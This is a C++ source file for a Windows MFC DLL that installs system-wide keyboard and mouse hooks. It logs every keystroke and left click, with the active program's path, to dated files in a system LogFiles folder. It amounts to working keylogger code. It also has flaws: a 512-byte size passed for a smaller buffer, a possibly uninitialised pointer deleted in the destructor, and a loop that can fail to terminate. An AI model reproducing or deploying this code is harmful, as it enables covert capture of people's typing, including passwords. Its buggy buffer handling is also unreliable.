#include "stdafx.h"
#include "hodll.h"
#include "stdio.h"
#include <Psapi.h>
   
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#pragma data_seg(".SHARDAT")
static HHOOK hkb_key=NULL;
static HHOOK hkb_mouse = NULL;
#pragma data_seg()
HINSTANCE hins;
#define LOG_KEY 0
#define LOG_MOUSE 1
char szBuf[256];
char *p;
////////////////////////////////////////////////
BEGIN_MESSAGE_MAP(CHodllApp, CWinApp)
END_MESSAGE_MAP()
/////////////////////////////////////////////////////////////////////////////

static void log_input(const char *msg, int type)
{
	static int file_day = 0;	// for midnight checking
	static ULONG event_num = 1;	// number of event in log file

	time_t tv;
	struct tm *tm;
	char tm_msg[1024];

	time(&tv);
	tm = localtime(&tv);
	if (tm == NULL) {
		return;
	}
	char fname[MAX_PATH];
	if (type == LOG_KEY) {
		if (_snprintf(fname, sizeof(fname),
			"%s\\system32\\LogFiles\\tdifw\\%04d%02d%02d.key.log",
			getenv("SystemRoot"),
			tm->tm_year + 1900,
			tm->tm_mon + 1,
			tm->tm_mday) == -1) {
				return;
		}
	} else if (type == LOG_MOUSE) {
		if (_snprintf(fname, sizeof(fname),
			"%s\\system32\\LogFiles\\tdifw\\%04d%02d%02d.mouse.log",
			getenv("SystemRoot"),
			tm->tm_year + 1900,
			tm->tm_mon + 1,
			tm->tm_mday) == -1) {
				return;
		}
	}
	FILE* g_logfile = fopen(fname, "a");
	if (g_logfile == NULL) {
		return;
	}
	if (type == LOG_KEY) {
		if (_snprintf(tm_msg, sizeof(tm_msg),
			"%010u %02d:%02d:%02d\tKey\t%s",
			event_num++, tm->tm_hour, tm->tm_min, tm->tm_sec, msg) == -1)
			tm_msg[sizeof(tm_msg) - 1] = '\0';
	} else if (type == LOG_MOUSE) {
		if (_snprintf(tm_msg, sizeof(tm_msg),
			"%010u %02d:%02d:%02d\tMouse\t%s",
			event_num++, tm->tm_hour, tm->tm_min, tm->tm_sec, msg) == -1)
			tm_msg[sizeof(tm_msg) - 1] = '\0';
	}
		// write it to log file
	fprintf(g_logfile, "%s\n", tm_msg);
	fclose(g_logfile);
}


LRESULT __declspec(dllexport)__stdcall  CALLBACK KeyboardProc(int nCode,WPARAM wParam,LPARAM lParam)
{	
	HWND hwnd;
	DWORD pid;
	if(((DWORD)lParam&0x40000000) && (HC_ACTION==nCode))
	{
		hwnd = GetForegroundWindow();
		GetWindowThreadProcessId(hwnd, &pid);
		CProcessModuleIterator itm(pid);
		HMODULE hModule = itm.First(); // .EXE
		TCHAR modname[_MAX_PATH];
		//GetModuleBaseName(itm.GetProcessHandle(), hModule, modname, _MAX_PATH);
		GetModuleFileName(hModule, modname, _MAX_PATH);
		char log_msg[_MAX_PATH + 32];
		if (wParam > 32 && wParam < 127) {
			_snprintf(log_msg, 512, "%s\t%c\n", modname, (char)wParam);	
		} else {
			_snprintf(log_msg, 512, "%s\t0x%x\n", modname, (unsigned int)wParam);
		}
		log_input(log_msg, LOG_KEY);
	} 
	LRESULT RetVal = CallNextHookEx( hkb_key, nCode, wParam, lParam );	
	return  RetVal;
}

LRESULT __declspec(dllexport)__stdcall  CALLBACK MouseProc(int nCode,WPARAM wParam,LPARAM lParam)
{	
	HWND hwnd;
	DWORD pid;
	if(HC_ACTION==nCode)
	{
		hwnd = ((PMOUSEHOOKSTRUCT)lParam)->hwnd;
		GetWindowThreadProcessId(hwnd, &pid);
		CProcessModuleIterator itm(pid);
		HMODULE hModule = itm.First(); // .EXE
		TCHAR modname[_MAX_PATH];
		//GetModuleBaseName(itm.GetProcessHandle(), hModule, modname, _MAX_PATH);
		GetModuleFileName(hModule, modname, _MAX_PATH);
		char log_msg[_MAX_PATH + 32];
		switch (wParam) {
			case WM_LBUTTONDOWN:
				_snprintf(log_msg, 512, "%s\t%s\n", modname, "LeftButtonDown");
				log_input(log_msg, LOG_MOUSE);
				break;
		}

	} 
	LRESULT RetVal = CallNextHookEx( hkb_mouse, nCode, wParam, lParam );	
	return  RetVal;
}



BOOL __declspec(dllexport)__stdcall installhook()
{
	hkb_key = SetWindowsHookEx(WH_KEYBOARD,(HOOKPROC)KeyboardProc,hins,0);
	hkb_mouse = SetWindowsHookEx(WH_MOUSE, (HOOKPROC)MouseProc, hins, 0);
	return TRUE;
}

BOOL __declspec(dllexport)  UnHook()
{   
	BOOL unhooked_key = UnhookWindowsHookEx(hkb_key);
	BOOL unhooked_mouse = UnhookWindowsHookEx(hkb_mouse);
	return unhooked_key && unhooked_mouse;
} 

BOOL CHodllApp::InitInstance ()
{	
	AFX_MANAGE_STATE(AfxGetStaticModuleState());
	hins=AfxGetInstanceHandle();
	return TRUE;	
}

BOOL CHodllApp::ExitInstance ()
{
	return TRUE;
}

CHodllApp::CHodllApp()
{
}

CProcessModuleIterator::CProcessModuleIterator(DWORD pid)
{
	// open the process
	m_hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
		FALSE, pid);
}

CProcessModuleIterator::~CProcessModuleIterator()
{
	CloseHandle(m_hProcess);
	delete [] m_hModules;
}

//////////////////
// Get first module in process. Call EnumProcesseModules to
// initialize entire array, then return first module.
//
HMODULE CProcessModuleIterator::First()
{
	m_count = 0;
	m_current = (DWORD)-1; 
	m_hModules = NULL;
	if (m_hProcess) {
		DWORD nalloc = 1024;
		do {
			delete [] m_hModules;
			m_hModules = new HMODULE [nalloc];
			if (EnumProcessModules(m_hProcess, m_hModules,
				nalloc*sizeof(DWORD), &m_count)) {
				m_count /= sizeof(HMODULE);
				m_current = 0;
			}
		} while (nalloc <= m_count);
	}
	return Next();
}

CHodllApp theApp;